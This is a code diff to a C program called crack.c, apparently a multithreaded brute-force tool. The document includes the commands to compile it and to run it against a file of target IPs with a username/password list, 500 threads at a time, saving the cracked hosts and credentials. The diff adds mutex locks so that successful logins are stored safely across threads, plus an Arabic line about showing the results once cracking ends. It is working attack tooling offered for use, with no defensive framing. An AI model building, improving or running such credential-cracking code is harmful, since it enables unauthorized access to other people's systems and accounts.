@@ -2,7 +2,7 @@ gcc crack.c -o crack -pthread
 ./crack --protocol 1 --threads 500 --targets 500 --targets-file ip.txt --user-pass-file User_Pass --success-file success.txt --reservation-file reservations.txt
 
 =====================================
-
+ستعرض النتائج بعد الانتهاء من الكراك
 #include <stdio.h>
 #include <stdlib.h>
 #include <getopt.h>
@@ -40,6 +40,8 @@ char reservation_file[MAX_LINE_SIZE] = "reservations_targets.txt";
 Target* targets;
 int num_user_pass;
 UserPass* user_passes;
+pthread_mutex_t success_mutex = PTHREAD_MUTEX_INITIALIZER;
+pthread_mutex_t reservation_mutex = PTHREAD_MUTEX_INITIALIZER;
 
 // Structure to hold successful targets
 typedef struct {
@@ -140,18 +142,22 @@ int is_credential_successful(const char* username, const char* password) {
 
 // Function to add the target to the success list
 void add_target_to_success(const char* ip, int port) {
+    pthread_mutex_lock(&success_mutex);
     successful_targets = realloc(successful_targets, sizeof(SuccessTarget) * (num_successful_targets + 1));
     strcpy(successful_targets[num_successful_targets].ip, ip);
     successful_targets[num_successful_targets].port = port;
     num_successful_targets++;
+    pthread_mutex_unlock(&success_mutex);
 }
 
 // Function to add the credential to the success list
 void add_credential_to_success(const char* username, const char* password) {
+    pthread_mutex_lock(&success_mutex);
     successful_credentials = realloc(successful_credentials, sizeof(UserPass) * (num_successful_credentials + 1));
     strcpy(successful_credentials[num_successful_credentials].username, username);
     strcpy(successful_credentials[num_successful_credentials].password, password);
     num_successful_credentials++;
+    pthread_mutex_unlock(&success_mutex);
 }
 
 // Function to perform cracking for a specific target and user/pass combination
